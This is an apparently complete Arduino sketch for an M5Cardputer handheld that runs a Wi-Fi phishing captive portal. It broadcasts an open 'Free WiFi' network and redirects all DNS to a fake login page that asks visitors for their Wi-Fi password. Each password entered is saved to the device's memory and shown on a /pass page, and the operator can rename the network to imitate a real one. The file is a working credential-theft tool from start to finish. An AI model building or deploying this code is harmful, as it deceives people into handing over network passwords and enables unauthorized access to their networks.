#include <M5Cardputer.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";

// Default main strings
#define SUBTITLE "Wi-Fi"
#define TITLE "Login"
#define BODY "This is the login page for your network."
#define POST_TITLE "Authentication in progress..."
#define POST_BODY "Logging in to the Wi-Fi network. Please wait a moment...</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
const unsigned long BATTERY_UPDATE_INTERVAL = 300000; // 5 minutes in milliseconds
IPAddress APIP(172, 0, 0, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, lastBatteryUpdate = 0;
DNSServer dnsServer;
WebServer webServer(80);

void updateBatteryDisplay() {
  int batteryLevel = M5.Power.getBatteryLevel();
  M5Cardputer.Display.setTextColor(TFT_PINK, TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 40); // Move cursor to battery line
  M5Cardputer.Display.printf("Battery: %d%%\n", batteryLevel);
  M5Cardputer.Display.display();
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
                "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
                "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
              "<head><title>" + a + " :: " + t + "</title>"
                                                 "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                                 "<style>" + CSS + "</style>"
                                                                    "<meta charset=\"UTF-8\"></head>"
                                                                    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Enter your Wi-Fi password:</label>" +
         "<input type=password name=m></input><input type=submit value=Connect></form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in an ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to the existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating the end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  
  // Wyświetl komunikat na ekranie
  M5Cardputer.Display.fillScreen(TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 0);
  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.println("Password saved.");
  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.print("Check password - go to ");
  M5Cardputer.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5Cardputer.Display.println("172.0.0.1/pass");
  delay(3000); // Wyświetlanie komunikatu przez 3 sekundy

  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Index</a></p><p><a style=\"color:blue\" href=/ssid>Change SSID</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the „Change SSID” button, you will lose the connection, so restart your device from Captive Portal and reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
}

String clear() {
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  
  // Wyświetl komunikat na ekranie
  M5Cardputer.Display.fillScreen(TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 0);
  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_RED, TFT_BLACK);
  M5Cardputer.Display.println("Password list cleared.");
  delay(3000); // Wyświetlanie komunikatu przez 3 sekundy
  
  // Po 3 sekundach wróć do ekranu startowego
  M5Cardputer.Display.fillScreen(TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 10);
  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5Cardputer.Display.println("Wi-Fi Login Page");

  // Pobierz poziom naładowania baterii
  updateBatteryDisplay();

  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
  M5Cardputer.Display.printf("SSID: %s\n", currentSSID.c_str());

  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.print("Change SSID - go to ");
  M5Cardputer.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5Cardputer.Display.println("172.0.0.1/ssid");

  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.print("Check password - go to ");
  M5Cardputer.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5Cardputer.Display.println("172.0.0.1/pass");

  M5Cardputer.Display.display();

  return header(CLEAR_TITLE) + "<div><p>The password list has been cleared.</div></p><center><a style=\"color:blue\" href=/pass>Back to Pass</a></center>" + footer();
}

void setup()
{
  // Inicjalizacja M5Cardputer
  auto cfg = M5.config();
  M5Cardputer.begin(cfg);
  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5Cardputer.Display.fillScreen(TFT_BLACK);

  M5Cardputer.Display.println("Starting WiFi Captive Portal");

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  String checkValue = "first"; // This will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the stored password in EEPROM.
    passEnd++;                             // Updating the end location of the password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); });
  webServer.on("/ssid", []() { webServer.send(200, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(200, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(200, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(200, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity = millis(); webServer.send(200, "text/html", index()); });
  webServer.begin();

  // Wyświetlanie informacji na ekranie
  M5Cardputer.Display.fillScreen(TFT_BLACK);
  M5Cardputer.Display.setCursor(0, 10);
  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5Cardputer.Display.println("Wi-Fi Login Page");

  // Pobierz i wyświetl poziom naładowania baterii
  updateBatteryDisplay();

  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
  M5Cardputer.Display.printf("SSID: %s\n", currentSSID.c_str());

  M5Cardputer.Display.setTextSize(2);
  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.print("Change SSID - go to ");
  M5Cardputer.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5Cardputer.Display.println("172.0.0.1/ssid");

  M5Cardputer.Display.setTextColor(TFT_GREEN, TFT_BLACK);
  M5Cardputer.Display.print("Check password - go to ");
  M5Cardputer.Display.setTextColor(TFT_CYAN, TFT_BLACK);
  M5Cardputer.Display.println("172.0.0.1/pass");

  M5Cardputer.Display.display();
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }

  // Aktualizuj poziom naładowania baterii co 5 minut
  if ((millis() - lastBatteryUpdate) > BATTERY_UPDATE_INTERVAL) {
    updateBatteryDisplay();
    lastBatteryUpdate = millis();
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
}
